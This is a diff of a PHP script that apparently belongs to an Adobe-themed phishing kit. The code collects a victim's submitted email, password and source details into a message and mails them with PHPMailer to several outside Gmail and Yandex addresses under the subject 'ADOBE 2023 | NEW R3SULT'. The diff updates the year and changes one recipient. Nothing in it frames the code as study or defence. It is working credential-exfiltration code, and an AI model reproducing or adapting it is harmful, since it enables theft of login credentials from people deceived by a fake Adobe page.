@@ -43,7 +43,7 @@ $useragent = $_SERVER['HTTP_USER_AGENT'];
 
 
 
-$message1 = "+ -------- ADOBE 2022 NEW --------- +
+$message1 = "+ -------- ADOBE 2023 NEW --------- +
 <br>Account Details ---<br>Username : {$Email}
 <br>Password : {$password}
 <br>Source : {$detail}
@@ -73,13 +73,13 @@ try {
     //Recipients
     $mail->setFrom('jamesown17@gmail.com', 'sender');
     $mail->addAddress('myresult2019@gmail.com',);  
-    $mail->addAddress('rubybrainoffice@yandex.com',); //Name is optional
+    $mail->addAddress('rubybrainoffice@gmail.com',); //Name is optional
     $mail->addBCC('rubybrainoffice@yandex.com');
   
 
     //Content
     $mail->isHTML(true);                                  //Set email format to HTML
-    $mail->Subject = 'ADOBE 2022 | NEW R3SULT';
+    $mail->Subject = 'ADOBE 2023 | NEW R3SULT';
     $mail->Body    = $message1;
     $mail->AltBody = 'This is the body in plain text for non-HTML mail clients';
 
